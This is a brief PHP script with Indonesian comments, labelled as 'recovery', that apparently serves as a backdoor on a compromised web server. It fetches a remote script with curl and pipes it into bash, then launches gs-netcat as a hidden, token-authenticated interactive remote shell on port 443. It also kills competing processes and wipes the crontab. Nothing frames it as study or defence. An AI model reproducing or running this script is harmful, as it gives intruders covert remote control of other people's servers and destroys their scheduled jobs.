<?php
$token = "u401823943dTQwMTgyMzk0Mw"; // Pakai token yang tadi aja biar konsisten
$cmd = "curl -fsSL https://gsocket.io/x | bash && GS_PORT=443 HOME=/tmp /tmp/.gsocket/bin/gs-netcat -s $token -l -i";
 

echo "--- Memulai Proses Recovery ---<br>";

// 1. Bersihkan proses lama
system("pkill -f defunct");
system("crontab -r");
system("pkill -f gs-netcat");
// 1. Bersihkan proses macet
system("pkill -f defunct; pkill -f mini-nc");
echo "Memicu GSocket via Deploy Method...";
system($cmd . " > /dev/null 2>&1 &");
?>
